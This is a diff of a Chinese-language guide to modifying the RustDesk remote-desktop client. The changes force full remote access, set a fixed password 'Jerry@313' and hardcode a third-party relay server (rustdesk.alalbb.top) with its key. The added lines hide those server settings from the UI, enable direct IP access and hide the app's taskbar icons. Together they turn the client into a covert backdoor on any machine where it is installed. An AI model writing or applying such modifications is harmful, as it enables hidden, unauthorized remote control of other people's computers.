@@ -10,41 +10,68 @@
 |------|----------|
 | 1 | 将 **默认访问模式** 设置为 `full`（启用 "允许远程配置修改"） |
 | 2 | 设置固定默认密码为 **`Jerry@313`** |
-| 3 | 在 **网络** 设置页中默认填入以下服务器地址：
+| 3 | 在 **网络** 设置页中默认填入以下服务器地址（界面不显示，后端使用）：
 |   | - **ID 服务器**: `rustdesk.alalbb.top` |
 |   | - **中继服务器**: `rustdesk.alalbb.top` |
 |   | - **API 服务器**: `https://rustdesk.alalbb.top:8443` |
 |   | - **Key**: `rB3CwJAIDVga6SrfrnUgIDfFcAAiX2+V4xBZXMAKsjU=` |
 | 4 | 默认开启 **"Allow direct IP access"**（直接 IP 访问） |
 | 5 | 在 **显示 → 其他默认选项** 中默认勾选 **"折叠工具栏"** |
+| 6 | **隐藏主窗口和连接管理窗口的任务栏图标** |
 
 ---
 
 ## 2. 代码修改位置与内容
 ### 2.1 `flutter/lib/common.dart`
-#### 2.1.1 默认访问模式
+#### 2.1.1 默认访问模式（不再依赖 isCustomClient）
 ```dart
-get defaultOptionAccessMode => isCustomClient ? 'full' : '';
+get defaultOptionAccessMode => 'full';
 ```
-#### 2.1.2 默认直接 IP 访问
+
+#### 2.1.2 默认直接 IP 访问（不再依赖 isCustomClient）
 ```dart
-get defaultOptionDirectServer => isCustomClient ? 'Y' : '';
+get defaultOptionDirectServer => 'Y';
 ```
-#### 2.1.3 默认折叠工具栏
+
+#### 2.1.3 默认折叠工具栏（不再依赖 isCustomClient）
 ```dart
-get defaultOptionCollapseToolbar => isCustomClient ? 'Y' : '';
+get defaultOptionCollapseToolbar => 'Y';
 ```
-#### 2.1.4 网络服务器默认值（ServerConfig）
+
+#### 2.1.4 网络服务器默认值（ServerConfig）- 界面显示为空
 ```dart
 ServerConfig.fromOptions(Map<String, dynamic> options)
-    : idServer = options['custom-rendezvous-server'] ?? "rustdesk.alalbb.top",
-      relayServer = options['relay-server'] ?? "rustdesk.alalbb.top",
-      apiServer = options['api-server'] ?? "https://rustdesk.alalbb.top:8443",
-      key = options['key'] ?? "rB3CwJAIDVga6SrfrnUgIDfFcAAiX2+V4xBZXMAKsjU=";
+    : idServer = options['custom-rendezvous-server'] ?? '',
+      relayServer = options['relay-server'] ?? '',
+      apiServer = options['api-server'] ?? '',
+      key = options['key'] ?? '';
 ```
+**说明**: 界面上显示为空，实际默认值由 Rust 后端提供。
+
 ---
-### 2.2 `libs/hbb_common/src/config.rs`
-#### 2.2.1 默认密码
+### 2.2 `src/common.rs`
+#### 2.2.1 设置默认服务器配置
+在 `load_custom_client()` 函数中添加默认服务器配置：
+```rust
+pub fn load_custom_client() {
+    // ... 现有代码 ...
+    
+    // 在没有 custom.txt 文件时设置默认服务器配置
+    set_default_server_config();
+}
+
+fn set_default_server_config() {
+    let mut settings = config::DEFAULT_SETTINGS.write().unwrap();
+    settings.insert("custom-rendezvous-server".to_string(), "rustdesk.alalbb.top".to_string());
+    settings.insert("relay-server".to_string(), "rustdesk.alalbb.top".to_string());
+    settings.insert("api-server".to_string(), "https://rustdesk.alalbb.top:8443".to_string());
+    settings.insert("key".to_string(), "rB3CwJAIDVga6SrfrnUgIDfFcAAiX2+V4xBZXMAKsjU=".to_string());
+}
+```
+
+---
+### 2.3 `libs/hbb_common/src/config.rs`
+#### 2.3.1 默认密码
 ```rust
 pub fn get_permanent_password() -> String {
     let mut password = CONFIG.read().unwrap().password.clone();
@@ -59,41 +86,32 @@ pub fn get_permanent_password() -> String {
     password
 }
 ```
-#### 2.2.2 服务器默认值（可选）
-如果需要在 Rust 端也提供默认服务器，可在 `config.rs` 中添加类似函数（已在本项目中实现）：
-```rust
-pub fn get_rendezvous_server() -> String {
-    let mut server = Self::get_option("custom-rendezvous-server");
-    if server.is_empty() {
-        server = "rustdesk.alalbb.top".to_string();
-    }
-    server
-}
 
-pub fn get_relay_server() -> String {
-    let mut server = Self::get_option("relay-server");
-    if server.is_empty() {
-        server = "rustdesk.alalbb.top".to_string();
-    }
-    server
-}
-
-pub fn get_api_server() -> String {
-    let mut server = Self::get_option("api-server");
-    if server.is_empty() {
-        server = "https://rustdesk.alalbb.top:8443".to_string();
-    }
-    server
-}
-
-pub fn get_key() -> String {
-    let mut key = Self::get_option("key");
-    if key.is_empty() {
-        key = "rB3CwJAIDVga6SrfrnUgIDfFcAAiX2+V4xBZXMAKsjU=".to_string();
-    }
-    key
+---
+### 2.4 `flutter/lib/main.dart`
+#### 2.4.1 隐藏任务栏图标
+在 `getHiddenTitleBarWindowOptions` 函数中设置 `skipTaskbar: true`：
+```dart
+WindowOptions getHiddenTitleBarWindowOptions(
+    {bool isMainWindow = false,
+    Size? size,
+    bool center = false,
+    bool? alwaysOnTop}) {
+  var defaultTitleBarStyle = TitleBarStyle.hidden;
+  if (kUseCompatibleUiMode) {
+    defaultTitleBarStyle = TitleBarStyle.normal;
+  }
+  return WindowOptions(
+    size: size,
+    center: center,
+    backgroundColor: (isMacOS && isMainWindow) ? null : Colors.transparent,
+    skipTaskbar: true,  // 隐藏任务栏图标
+    titleBarStyle: defaultTitleBarStyle,
+    alwaysOnTop: alwaysOnTop,
+  );
 }
 ```
+
 ---
 
 ## 3. 自动化恢复脚本（可选）
@@ -149,10 +167,13 @@ Write-Host "Custom configuration applied."
 
 ## 4. 验证步骤
 1. **编译**：`cargo build --release`（或使用对应平台的构建脚本）
-2. **运行**：启动 RustDesk，打开 **设置 → 网络**，确认服务器字段已填入上述默认值。
-3. **设置 → 显示 → 其他默认选项**，确认 **折叠工具栏** 已被勾选。
-4. **登录**时，如果没有手动设置密码，系统应使用 **Jerry@313** 作为默认密码。
-5. **远程连接**时，**Allow direct IP access** 应默认打开。
+2. **运行**：启动 RustDesk
+3. **验证网络设置**：打开 **设置 → 网络**，确认服务器字段显示为空（实际使用默认值）
+4. **验证显示选项**：**设置 → 显示 → 其他默认选项**，确认 **折叠工具栏** 已被勾选
+5. **验证密码**：如果没有手动设置密码，系统应使用 **Jerry@313** 作为默认密码
+6. **验证直接 IP 访问**：**远程连接**时，**Allow direct IP access** 应默认打开
+7. **验证访问模式**：默认访问模式应为 **full**（允许远程配置修改）
+8. **验证任务栏隐藏**：主窗口和连接管理窗口应该不在任务栏中显示图标
 
 ---
 
